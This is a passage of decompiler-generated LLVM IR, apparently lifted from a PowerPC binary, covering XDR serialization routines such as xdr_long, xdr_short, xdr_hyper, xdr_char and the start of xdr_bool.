  uselistorder label %dec_label_pc_10013158, { 1, 0 }
  uselistorder label %dec_label_pc_10013154, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_10013148, { 1, 0 }
  uselistorder label %dec_label_pc_100130bc, { 0, 2, 1 }
  uselistorder label %dec_label_pc_100130a0, { 1, 0 }
}

define i32 @xdr_free(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_10013198 = ptrtoint i32* %stack_var_-40 to i32
  store i32 2, i32* %stack_var_-40, align 4
  call void @__pseudo_call(i32 %arg1)
  ret i32 %v2_10013198
}

define i32 @xdr_void() local_unnamed_addr {
entry:
  ret i32 1
}

define i32 @__GI_xdr_long() local_unnamed_addr {
entry:
  %v0_100131d4 = load i32, i32* @r3, align 4
  %v1_100131d4 = inttoptr i32 %v0_100131d4 to i32*
  %v2_100131d4 = load i32, i32* %v1_100131d4, align 4
  %v3_100131d8 = icmp eq i32 %v2_100131d4, 0
  br i1 %v3_100131d8, label %dec_label_pc_100131e4, label %dec_label_pc_100131f0

dec_label_pc_100131e4:                            ; preds = %entry
  %v1_100131e4 = add i32 %v0_100131d4, 4
  %v2_100131e4 = inttoptr i32 %v1_100131e4 to i32*
  %v3_100131e4 = load i32, i32* %v2_100131e4, align 4
  %v1_100131e8 = add i32 %v3_100131e4, 4
  br label %dec_label_pc_10013204

dec_label_pc_100131f0:                            ; preds = %entry
  %v3_100131dc = icmp eq i32 %v2_100131d4, 1
  br i1 %v3_100131dc, label %dec_label_pc_100131fc, label %dec_label_pc_10013218

dec_label_pc_100131fc:                            ; preds = %dec_label_pc_100131f0
  %v1_100131fc = add i32 %v0_100131d4, 4
  %v2_100131fc = inttoptr i32 %v1_100131fc to i32*
  %v3_100131fc = load i32, i32* %v2_100131fc, align 4
  br label %dec_label_pc_10013204

dec_label_pc_10013204:                            ; preds = %dec_label_pc_100131e4, %dec_label_pc_100131fc
  %storemerge.in.in = phi i32 [ %v1_100131e8, %dec_label_pc_100131e4 ], [ %v3_100131fc, %dec_label_pc_100131fc ]
  %storemerge.in = inttoptr i32 %storemerge.in.in to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  call void @__pseudo_call(i32 %storemerge)
  %v0_1001320c = load i32, i32* @r3, align 4
  br label %dec_label_pc_10013218

dec_label_pc_10013218:                            ; preds = %dec_label_pc_100131f0, %dec_label_pc_10013204
  %storemerge1 = phi i32 [ %v0_1001320c, %dec_label_pc_10013204 ], [ 0, %dec_label_pc_100131f0 ]
  ret i32 %storemerge1

; uselistorder directives
  uselistorder i32 %v0_100131d4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10013218, { 1, 0 }
  uselistorder label %dec_label_pc_10013204, { 1, 0 }
}

define i32 @xdr_short(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %stack_var_-24 = alloca i16, align 2
  store i32 %arg2, i32* %r31.global-to-local, align 4
  %v0_10013244 = load i32, i32* %r3.global-to-local, align 4
  %v1_10013244 = inttoptr i32 %v0_10013244 to i32*
  %v2_10013244 = load i32, i32* %v1_10013244, align 4
  %v3_10013248 = icmp eq i32 %v2_10013244, 1
  br i1 %v3_10013248, label %dec_label_pc_10013284, label %dec_label_pc_10013254

dec_label_pc_10013254:                            ; preds = %entry
  %v1_1001324c = icmp eq i32 %v2_10013244, 0
  br i1 %v1_1001324c, label %dec_label_pc_10013268, label %dec_label_pc_1001325c

dec_label_pc_1001325c:                            ; preds = %dec_label_pc_10013254
  %v3_10013254 = icmp eq i32 %v2_10013244, 2
  store i32 1, i32* %r3.global-to-local, align 4
  br i1 %v3_10013254, label %dec_label_pc_100132b0, label %dec_label_pc_100132ac

dec_label_pc_10013268:                            ; preds = %dec_label_pc_10013254
  %v1_10013268 = inttoptr i32 %arg2 to i16*
  %v2_10013268 = load i16, i16* %v1_10013268, align 2
  %v1_1001326c = add i32 %v0_10013244, 4
  %v2_1001326c = inttoptr i32 %v1_1001326c to i32*
  %v3_1001326c = load i32, i32* %v2_1001326c, align 4
  store i16 %v2_10013268, i16* %stack_var_-24, align 2
  %v1_10013274 = add i32 %v3_1001326c, 4
  %v2_10013274 = inttoptr i32 %v1_10013274 to i32*
  %v3_10013274 = load i32, i32* %v2_10013274, align 4
  call void @__pseudo_call(i32 %v3_10013274)
  br label %dec_label_pc_100132b0

dec_label_pc_10013284:                            ; preds = %entry
  %v1_10013284 = add i32 %v0_10013244, 4
  %v2_10013284 = inttoptr i32 %v1_10013284 to i32*
  %v3_10013284 = load i32, i32* %v2_10013284, align 4
  %v1_10013288 = inttoptr i32 %v3_10013284 to i32*
  %v2_10013288 = load i32, i32* %v1_10013288, align 4
  call void @__pseudo_call(i32 %v2_10013288)
  %v0_10013294 = load i32, i32* %r3.global-to-local, align 4
  %v3_10013294 = icmp eq i32 %v0_10013294, 0
  store i32 1, i32* %r3.global-to-local, align 4
  br i1 %v3_10013294, label %dec_label_pc_100132ac, label %dec_label_pc_100132a0

dec_label_pc_100132a0:                            ; preds = %dec_label_pc_10013284
  %v3_100132a0 = load i16, i16* %stack_var_-24, align 2
  %v2_100132a4 = load i32, i32* %r31.global-to-local, align 4
  %v3_100132a4 = inttoptr i32 %v2_100132a4 to i16*
  store i16 %v3_100132a0, i16* %v3_100132a4, align 2
  br label %dec_label_pc_100132b0

dec_label_pc_100132ac:                            ; preds = %dec_label_pc_1001325c, %dec_label_pc_10013284
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100132b0

dec_label_pc_100132b0:                            ; preds = %dec_label_pc_1001325c, %dec_label_pc_100132a0, %dec_label_pc_10013268, %dec_label_pc_100132ac
  %v0_100132c0 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_100132c0

; uselistorder directives
  uselistorder i16* %stack_var_-24, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 5, 3, 4, 0, 6, 1, 2 }
  uselistorder label %dec_label_pc_100132b0, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_100132ac, { 1, 0 }
}

define i32 @__GI_xdr_int(i32 %arg1) local_unnamed_addr {
entry:
  %v0_100132c4 = call i32 @__GI_xdr_long()
  ret i32 %v0_100132c4
}

define i32 @xdr_u_long() local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v0_100132d4 = load i32, i32* @r4, align 4
  store i32 %v0_100132d4, i32* %r31.global-to-local, align 4
  %v0_100132dc = load i32, i32* @r3, align 4
  %v1_100132dc = inttoptr i32 %v0_100132dc to i32*
  %v2_100132dc = load i32, i32* %v1_100132dc, align 4
  %v3_100132e0 = icmp eq i32 %v2_100132dc, 1
  br i1 %v3_100132e0, label %dec_label_pc_10013300, label %dec_label_pc_100132ec

dec_label_pc_100132ec:                            ; preds = %entry
  %v1_100132e4 = icmp eq i32 %v2_100132dc, 0
  br i1 %v1_100132e4, label %dec_label_pc_1001332c, label %dec_label_pc_100132f4

dec_label_pc_100132f4:                            ; preds = %dec_label_pc_100132ec
  %v3_100132ec = icmp eq i32 %v2_100132dc, 2
  store i32 1, i32* @r3, align 4
  br i1 %v3_100132ec, label %dec_label_pc_10013344, label %dec_label_pc_10013340

dec_label_pc_10013300:                            ; preds = %entry
  %v1_10013300 = add i32 %v0_100132dc, 4
  %v2_10013300 = inttoptr i32 %v1_10013300 to i32*
  %v3_10013300 = load i32, i32* %v2_10013300, align 4
  %v1_10013308 = inttoptr i32 %v3_10013300 to i32*
  %v2_10013308 = load i32, i32* %v1_10013308, align 4
  call void @__pseudo_call(i32 %v2_10013308)
  %v0_10013314 = load i32, i32* @r3, align 4
  %v3_10013314 = icmp eq i32 %v0_10013314, 0
  store i32 1, i32* @r3, align 4
  br i1 %v3_10013314, label %dec_label_pc_10013340, label %dec_label_pc_10013320

dec_label_pc_10013320:                            ; preds = %dec_label_pc_10013300
  %v3_10013320 = load i32, i32* %stack_var_-24, align 4
  %v1_10013324 = load i32, i32* %r31.global-to-local, align 4
  %v2_10013324 = inttoptr i32 %v1_10013324 to i32*
  store i32 %v3_10013320, i32* %v2_10013324, align 4
  br label %dec_label_pc_10013344

dec_label_pc_1001332c:                            ; preds = %dec_label_pc_100132ec
  %v1_1001332c = add i32 %v0_100132dc, 4
  %v2_1001332c = inttoptr i32 %v1_1001332c to i32*
  %v3_1001332c = load i32, i32* %v2_1001332c, align 4
  %v1_10013330 = add i32 %v3_1001332c, 4
  %v2_10013330 = inttoptr i32 %v1_10013330 to i32*
  %v3_10013330 = load i32, i32* %v2_10013330, align 4
  call void @__pseudo_call(i32 %v3_10013330)
  br label %dec_label_pc_10013344

dec_label_pc_10013340:                            ; preds = %dec_label_pc_100132f4, %dec_label_pc_10013300
  store i32 0, i32* @r3, align 4
  br label %dec_label_pc_10013344

dec_label_pc_10013344:                            ; preds = %dec_label_pc_100132f4, %dec_label_pc_1001332c, %dec_label_pc_10013320, %dec_label_pc_10013340
  %v0_10013354 = load i32, i32* @r3, align 4
  ret i32 %v0_10013354

; uselistorder directives
  uselistorder i32 %v0_100132dc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10013344, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_10013340, { 1, 0 }
}

define i32 @xdr_u_int(i32* %xdrs, i32* %ulp) local_unnamed_addr {
entry:
  %v0_10013358 = call i32 @xdr_u_long()
  ret i32 %v0_10013358
}

define i32 @__GI_xdr_hyper() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v0_1001335c = load i32, i32* @lr, align 4
  store i32 %v0_1001335c, i32* %r0.global-to-local, align 4
  %v0_10013368 = load i32, i32* @r4, align 4
  store i32 %v0_10013368, i32* %r30.global-to-local, align 4
  %v0_10013370 = load i32, i32* @r3, align 4
  store i32 %v0_10013370, i32* %r31.global-to-local, align 4
  %v1_10013378 = inttoptr i32 %v0_10013370 to i32*
  %v2_10013378 = load i32, i32* %v1_10013378, align 4
  store i32 %v2_10013378, i32* %r0.global-to-local, align 4
  %v3_1001337c = icmp eq i32 %v2_10013378, 0
  br i1 %v3_1001337c, label %dec_label_pc_10013388, label %dec_label_pc_100133e8

dec_label_pc_10013388:                            ; preds = %entry
  %v1_10013388 = inttoptr i32 %v0_10013368 to i32*
  %v2_10013388 = load i32, i32* %v1_10013388, align 4
  %v1_1001338c = add i32 %v0_10013368, 4
  %v2_1001338c = inttoptr i32 %v1_1001338c to i32*
  %v3_10013390 = load i32, i32* %v2_1001338c, align 4
  store i32 %v3_10013390, i32* %r0.global-to-local, align 4
  %v1_1001339c = add i32 %v0_10013370, 4
  %v2_1001339c = inttoptr i32 %v1_1001339c to i32*
  %v3_1001339c = load i32, i32* %v2_1001339c, align 4
  store i32 %v2_10013388, i32* %stack_var_-24, align 4
  store i32 %v3_10013390, i32* %stack_var_-20, align 4
  %v1_100133a8 = add i32 %v3_1001339c, 4
  %v2_100133a8 = inttoptr i32 %v1_100133a8 to i32*
  %v3_100133a8 = load i32, i32* %v2_100133a8, align 4
  call void @__pseudo_call(i32 %v3_100133a8)
  %v0_100133b8 = load i32, i32* @r3, align 4
  %v3_100133b8 = icmp eq i32 %v0_100133b8, 0
  store i32 0, i32* %r8.global-to-local, align 4
  %v0_100133c0 = load i32, i32* %r31.global-to-local, align 4
  store i32 %v0_100133c0, i32* %r3.global-to-local, align 4
  br i1 %v3_100133b8, label %dec_label_pc_10013450, label %dec_label_pc_100133c8

dec_label_pc_100133c8:                            ; preds = %dec_label_pc_10013388
  %v1_100133c8 = add i32 %v0_100133c0, 4
  %v2_100133c8 = inttoptr i32 %v1_100133c8 to i32*
  %v3_100133c8 = load i32, i32* %v2_100133c8, align 4
  %v1_100133cc = add i32 %v3_100133c8, 4
  %v2_100133cc = inttoptr i32 %v1_100133cc to i32*
  %v3_100133cc = load i32, i32* %v2_100133cc, align 4
  call void @__pseudo_call(i32 %v3_100133cc)
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_10013450

dec_label_pc_100133e8:                            ; preds = %entry
  %v3_10013380 = icmp eq i32 %v2_10013378, 1
  store i32 0, i32* %r8.global-to-local, align 4
  br i1 %v3_10013380, label %dec_label_pc_100133fc, label %dec_label_pc_10013450

dec_label_pc_100133fc:                            ; preds = %dec_label_pc_100133e8
  %v1_100133fc = add i32 %v0_10013370, 4
  %v2_100133fc = inttoptr i32 %v1_100133fc to i32*
  %v3_100133fc = load i32, i32* %v2_100133fc, align 4
  %v1_10013400 = inttoptr i32 %v3_100133fc to i32*
  %v2_10013400 = load i32, i32* %v1_10013400, align 4
  call void @__pseudo_call(i32 %v2_10013400)
  %v0_10013410 = load i32, i32* @r3, align 4
  %v3_10013410 = icmp eq i32 %v0_10013410, 0
  %v0_10013414 = load i32, i32* %r31.global-to-local, align 4
  store i32 %v0_10013414, i32* %r3.global-to-local, align 4
  br i1 %v3_10013410, label %dec_label_pc_1001344c, label %dec_label_pc_1001341c

dec_label_pc_1001341c:                            ; preds = %dec_label_pc_100133fc
  %v1_1001341c = add i32 %v0_10013414, 4
  %v2_1001341c = inttoptr i32 %v1_1001341c to i32*
  %v3_1001341c = load i32, i32* %v2_1001341c, align 4
  %v1_10013420 = inttoptr i32 %v3_1001341c to i32*
  %v2_10013420 = load i32, i32* %v1_10013420, align 4
  call void @__pseudo_call(i32 %v2_10013420)
  store i32 1, i32* %r8.global-to-local, align 4
  %v0_10013430 = load i32, i32* %r3.global-to-local, align 4
  %v3_10013430 = icmp eq i32 %v0_10013430, 0
  br i1 %v3_10013430, label %dec_label_pc_1001344c, label %dec_label_pc_10013438

dec_label_pc_10013438:                            ; preds = %dec_label_pc_1001341c
  %v3_10013438 = load i32, i32* %stack_var_-20, align 4
  %v3_1001343c = load i32, i32* %stack_var_-24, align 4
  store i32 %v3_1001343c, i32* %r0.global-to-local, align 4
  %v1_10013440 = load i32, i32* %r30.global-to-local, align 4
  %v2_10013440 = add i32 %v1_10013440, 4
  %v3_10013440 = inttoptr i32 %v2_10013440 to i32*
  store i32 %v3_10013438, i32* %v3_10013440, align 4
  %v0_10013444 = load i32, i32* %r0.global-to-local, align 4
  %v1_10013444 = load i32, i32* %r30.global-to-local, align 4
  %v2_10013444 = inttoptr i32 %v1_10013444 to i32*
  store i32 %v0_10013444, i32* %v2_10013444, align 4
  %v0_10013454.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_10013450

dec_label_pc_1001344c:                            ; preds = %dec_label_pc_1001341c, %dec_label_pc_100133fc
  store i32 0, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_10013450

dec_label_pc_10013450:                            ; preds = %dec_label_pc_100133e8, %dec_label_pc_10013388, %dec_label_pc_10013438, %dec_label_pc_100133c8, %dec_label_pc_1001344c
  %v0_10013454 = phi i32 [ 0, %dec_label_pc_100133e8 ], [ 0, %dec_label_pc_10013388 ], [ %v0_10013454.pre, %dec_label_pc_10013438 ], [ 1, %dec_label_pc_100133c8 ], [ 0, %dec_label_pc_1001344c ]
  store i32 %v0_1001335c, i32* %r0.global-to-local, align 4
  store i32 %v0_10013454, i32* %r3.global-to-local, align 4
  ret i32 %v0_10013454

; uselistorder directives
  uselistorder i32 %v0_10013454, { 1, 0 }
  uselistorder i32 %v0_10013370, { 1, 0, 2, 3 }
  uselistorder i32 %v0_10013368, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10013450, { 4, 2, 0, 3, 1 }
}

define i32 @xdr_u_hyper() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v0_10013468 = load i32, i32* @lr, align 4
  store i32 %v0_10013468, i32* %r0.global-to-local, align 4
  %v0_10013474 = load i32, i32* @r4, align 4
  store i32 %v0_10013474, i32* %r30.global-to-local, align 4
  %v0_1001347c = load i32, i32* @r3, align 4
  store i32 %v0_1001347c, i32* %r31.global-to-local, align 4
  %v1_10013484 = inttoptr i32 %v0_1001347c to i32*
  %v2_10013484 = load i32, i32* %v1_10013484, align 4
  store i32 %v2_10013484, i32* %r0.global-to-local, align 4
  %v3_10013488 = icmp eq i32 %v2_10013484, 0
  br i1 %v3_10013488, label %dec_label_pc_10013494, label %dec_label_pc_100134e8

dec_label_pc_10013494:                            ; preds = %entry
  %v1_10013494 = add i32 %v0_10013474, 4
  %v2_10013494 = inttoptr i32 %v1_10013494 to i32*
  %v3_10013494 = load i32, i32* %v2_10013494, align 4
  store i32 %v3_10013494, i32* %r0.global-to-local, align 4
  %v1_10013498 = inttoptr i32 %v0_10013474 to i32*
  %v2_10013498 = load i32, i32* %v1_10013498, align 4
  store i32 %v2_10013498, i32* %r10.global-to-local, align 4
  %v1_1001349c = add i32 %v0_1001347c, 4
  %v2_1001349c = inttoptr i32 %v1_1001349c to i32*
  %v3_1001349c = load i32, i32* %v2_1001349c, align 4
  store i32 %v3_10013494, i32* %stack_var_-20, align 4
  store i32 %v2_10013498, i32* %stack_var_-24, align 4
  %v1_100134a8 = add i32 %v3_1001349c, 4
  %v2_100134a8 = inttoptr i32 %v1_100134a8 to i32*
  %v3_100134a8 = load i32, i32* %v2_100134a8, align 4
  call void @__pseudo_call(i32 %v3_100134a8)
  %v0_100134b8 = load i32, i32* @r3, align 4
  %v3_100134b8 = icmp eq i32 %v0_100134b8, 0
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_100134c0 = load i32, i32* %r31.global-to-local, align 4
  store i32 %v0_100134c0, i32* %r3.global-to-local, align 4
  br i1 %v3_100134b8, label %dec_label_pc_10013550, label %dec_label_pc_100134c8

dec_label_pc_100134c8:                            ; preds = %dec_label_pc_10013494
  %v1_100134c8 = add i32 %v0_100134c0, 4
  %v2_100134c8 = inttoptr i32 %v1_100134c8 to i32*
  %v3_100134c8 = load i32, i32* %v2_100134c8, align 4
  %v1_100134cc = add i32 %v3_100134c8, 4
  %v2_100134cc = inttoptr i32 %v1_100134cc to i32*
  %v3_100134cc = load i32, i32* %v2_100134cc, align 4
  call void @__pseudo_call(i32 %v3_100134cc)
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10013550

dec_label_pc_100134e8:                            ; preds = %entry
  %v3_1001348c = icmp eq i32 %v2_10013484, 1
  store i32 0, i32* %r0.global-to-local, align 4
  br i1 %v3_1001348c, label %dec_label_pc_100134fc, label %dec_label_pc_10013550

dec_label_pc_100134fc:                            ; preds = %dec_label_pc_100134e8
  %v1_100134fc = add i32 %v0_1001347c, 4
  %v2_100134fc = inttoptr i32 %v1_100134fc to i32*
  %v3_100134fc = load i32, i32* %v2_100134fc, align 4
  %v1_10013500 = inttoptr i32 %v3_100134fc to i32*
  %v2_10013500 = load i32, i32* %v1_10013500, align 4
  call void @__pseudo_call(i32 %v2_10013500)
  %v0_10013510 = load i32, i32* @r3, align 4
  %v3_10013510 = icmp eq i32 %v0_10013510, 0
  %v0_10013514 = load i32, i32* %r31.global-to-local, align 4
  store i32 %v0_10013514, i32* %r3.global-to-local, align 4
  br i1 %v3_10013510, label %dec_label_pc_1001354c, label %dec_label_pc_1001351c

dec_label_pc_1001351c:                            ; preds = %dec_label_pc_100134fc
  %v1_1001351c = add i32 %v0_10013514, 4
  %v2_1001351c = inttoptr i32 %v1_1001351c to i32*
  %v3_1001351c = load i32, i32* %v2_1001351c, align 4
  %v1_10013520 = inttoptr i32 %v3_1001351c to i32*
  %v2_10013520 = load i32, i32* %v1_10013520, align 4
  call void @__pseudo_call(i32 %v2_10013520)
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_10013530 = load i32, i32* %r3.global-to-local, align 4
  %v3_10013530 = icmp eq i32 %v0_10013530, 0
  br i1 %v3_10013530, label %dec_label_pc_1001354c, label %dec_label_pc_10013538

dec_label_pc_10013538:                            ; preds = %dec_label_pc_1001351c
  %v3_10013538 = load i32, i32* %stack_var_-24, align 4
  %v3_1001353c = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_1001353c, i32* %r10.global-to-local, align 4
  %v1_10013540 = load i32, i32* %r30.global-to-local, align 4
  %v2_10013540 = inttoptr i32 %v1_10013540 to i32*
  store i32 %v3_10013538, i32* %v2_10013540, align 4
  %v0_10013544 = load i32, i32* %r10.global-to-local, align 4
  %v1_10013544 = load i32, i32* %r30.global-to-local, align 4
  %v2_10013544 = add i32 %v1_10013544, 4
  %v3_10013544 = inttoptr i32 %v2_10013544 to i32*
  store i32 %v0_10013544, i32* %v3_10013544, align 4
  %v0_10013550.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10013550

dec_label_pc_1001354c:                            ; preds = %dec_label_pc_1001351c, %dec_label_pc_100134fc
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10013550

dec_label_pc_10013550:                            ; preds = %dec_label_pc_100134e8, %dec_label_pc_10013494, %dec_label_pc_10013538, %dec_label_pc_100134c8, %dec_label_pc_1001354c
  %v0_10013550 = phi i32 [ 0, %dec_label_pc_100134e8 ], [ 0, %dec_label_pc_10013494 ], [ %v0_10013550.pre, %dec_label_pc_10013538 ], [ 1, %dec_label_pc_100134c8 ], [ 0, %dec_label_pc_1001354c ]
  store i32 %v0_10013550, i32* %r3.global-to-local, align 4
  store i32 %v0_10013468, i32* %r0.global-to-local, align 4
  ret i32 %v0_10013550

; uselistorder directives
  uselistorder i32 %v0_10013550, { 1, 0 }
  uselistorder i32 %v0_1001347c, { 1, 0, 2, 3 }
  uselistorder i32 %v0_10013474, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10013550, { 4, 2, 0, 3, 1 }
}

define i32 @xdr_longlong_t() local_unnamed_addr {
entry:
  %v0_10013568 = call i32 @__GI_xdr_hyper()
  ret i32 %v0_10013568
}

define i32 @xdr_u_longlong_t(i32* %xdrs, i64* %ullp) local_unnamed_addr {
entry:
  %v0_1001356c = call i32 @xdr_u_hyper()
  ret i32 %v0_1001356c
}

define i32 @__GI_xdr_u_short(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %stack_var_-24 = alloca i16, align 2
  store i32 %arg2, i32* %r31.global-to-local, align 4
  %v0_10013588 = load i32, i32* %r3.global-to-local, align 4
  %v1_10013588 = inttoptr i32 %v0_10013588 to i32*
  %v2_10013588 = load i32, i32* %v1_10013588, align 4
  %v3_1001358c = icmp eq i32 %v2_10013588, 1
  br i1 %v3_1001358c, label %dec_label_pc_100135c8, label %dec_label_pc_10013598

dec_label_pc_10013598:                            ; preds = %entry
  %v1_10013590 = icmp eq i32 %v2_10013588, 0
  br i1 %v1_10013590, label %dec_label_pc_100135ac, label %dec_label_pc_100135a0

dec_label_pc_100135a0:                            ; preds = %dec_label_pc_10013598
  %v3_10013598 = icmp eq i32 %v2_10013588, 2
  store i32 1, i32* %r3.global-to-local, align 4
  br i1 %v3_10013598, label %dec_label_pc_100135f4, label %dec_label_pc_100135f0

dec_label_pc_100135ac:                            ; preds = %dec_label_pc_10013598
  %v1_100135ac = inttoptr i32 %arg2 to i16*
  %v2_100135ac = load i16, i16* %v1_100135ac, align 2
  %v1_100135b0 = add i32 %v0_10013588, 4
  %v2_100135b0 = inttoptr i32 %v1_100135b0 to i32*
  %v3_100135b0 = load i32, i32* %v2_100135b0, align 4
  store i16 %v2_100135ac, i16* %stack_var_-24, align 2
  %v1_100135b8 = add i32 %v3_100135b0, 4
  %v2_100135b8 = inttoptr i32 %v1_100135b8 to i32*
  %v3_100135b8 = load i32, i32* %v2_100135b8, align 4
  call void @__pseudo_call(i32 %v3_100135b8)
  br label %dec_label_pc_100135f4

dec_label_pc_100135c8:                            ; preds = %entry
  %v1_100135c8 = add i32 %v0_10013588, 4
  %v2_100135c8 = inttoptr i32 %v1_100135c8 to i32*
  %v3_100135c8 = load i32, i32* %v2_100135c8, align 4
  %v1_100135cc = inttoptr i32 %v3_100135c8 to i32*
  %v2_100135cc = load i32, i32* %v1_100135cc, align 4
  call void @__pseudo_call(i32 %v2_100135cc)
  %v0_100135d8 = load i32, i32* %r3.global-to-local, align 4
  %v3_100135d8 = icmp eq i32 %v0_100135d8, 0
  store i32 1, i32* %r3.global-to-local, align 4
  br i1 %v3_100135d8, label %dec_label_pc_100135f0, label %dec_label_pc_100135e4

dec_label_pc_100135e4:                            ; preds = %dec_label_pc_100135c8
  %v3_100135e4 = load i16, i16* %stack_var_-24, align 2
  %v2_100135e8 = load i32, i32* %r31.global-to-local, align 4
  %v3_100135e8 = inttoptr i32 %v2_100135e8 to i16*
  store i16 %v3_100135e4, i16* %v3_100135e8, align 2
  br label %dec_label_pc_100135f4

dec_label_pc_100135f0:                            ; preds = %dec_label_pc_100135a0, %dec_label_pc_100135c8
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100135f4

dec_label_pc_100135f4:                            ; preds = %dec_label_pc_100135a0, %dec_label_pc_100135e4, %dec_label_pc_100135ac, %dec_label_pc_100135f0
  %v0_10013604 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_10013604

; uselistorder directives
  uselistorder i16* %stack_var_-24, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 5, 3, 4, 0, 6, 1, 2 }
  uselistorder label %dec_label_pc_100135f4, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_100135f0, { 1, 0 }
}

define i32 @xdr_char(i8* %arg1) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-24 = alloca i8, align 1
  store i32 %tmp, i32* %r31.global-to-local, align 4
  %v3_1001361c = load i8, i8* %arg1, align 1
  %v2_10013620 = ptrtoint i8* %stack_var_-24 to i32
  store i8 %v3_1001361c, i8* %stack_var_-24, align 1
  store i32 268514860, i32* @lr, align 4
  %v1_10013628 = call i32 @__GI_xdr_int(i32 %v2_10013620)
  %v3_1001362c = icmp eq i32 %v1_10013628, 0
  store i32 0, i32* %r3.global-to-local, align 4
  br i1 %v3_1001362c, label %dec_label_pc_10013644, label %dec_label_pc_10013638

dec_label_pc_10013638:                            ; preds = %entry
  %v3_10013638 = load i8, i8* %stack_var_-24, align 1
  store i32 1, i32* %r3.global-to-local, align 4
  %v2_10013640 = load i32, i32* %r31.global-to-local, align 4
  %v3_10013640 = inttoptr i32 %v2_10013640 to i8*
  store i8 %v3_10013638, i8* %v3_10013640, align 1
  %v0_10013654.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10013644

dec_label_pc_10013644:                            ; preds = %entry, %dec_label_pc_10013638
  %v0_10013654 = phi i32 [ 0, %entry ], [ %v0_10013654.pre, %dec_label_pc_10013638 ]
  ret i32 %v0_10013654

; uselistorder directives
  uselistorder i8* %stack_var_-24, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10013644, { 1, 0 }
}

define i32 @xdr_u_char(i8* %arg1) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-24 = alloca i8, align 1
  store i32 %tmp, i32* @r31, align 4
  %v3_1001366c = load i8, i8* %arg1, align 1
  %v2_10013670 = ptrtoint i8* %stack_var_-24 to i32
  store i32 %v2_10013670, i32* @r4, align 4
  store i8 %v3_1001366c, i8* %stack_var_-24, align 1
  store i32 268514940, i32* @lr, align 4
  %v2_10013678 = bitcast i8* %stack_var_-24 to i32*
  %v4_10013678 = call i32 @xdr_u_int(i32* %v2_10013678, i32* %v2_10013678)
  %v3_1001367c = icmp eq i32 %v4_10013678, 0
  store i32 0, i32* %r3.global-to-local, align 4
  br i1 %v3_1001367c, label %dec_label_pc_10013694, label %dec_label_pc_10013688

dec_label_pc_10013688:                            ; preds = %entry
  %v3_10013688 = load i8, i8* %stack_var_-24, align 1
  store i32 1, i32* %r3.global-to-local, align 4
  %v2_10013690 = load i32, i32* @r31, align 4
  %v3_10013690 = inttoptr i32 %v2_10013690 to i8*
  store i8 %v3_10013688, i8* %v3_10013690, align 1
  %v0_100136a4.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10013694

dec_label_pc_10013694:                            ; preds = %entry, %dec_label_pc_10013688
  %v0_100136a4 = phi i32 [ 0, %entry ], [ %v0_100136a4.pre, %dec_label_pc_10013688 ]
  ret i32 %v0_100136a4

; uselistorder directives
  uselistorder i8* %stack_var_-24, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_10013694, { 1, 0 }
}

define i32 @xdr_bool(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg2, i32* %r31.global-to-local, align 4
  %v0_100136c0 = load i32, i32* %r3.global-to-local, align 4
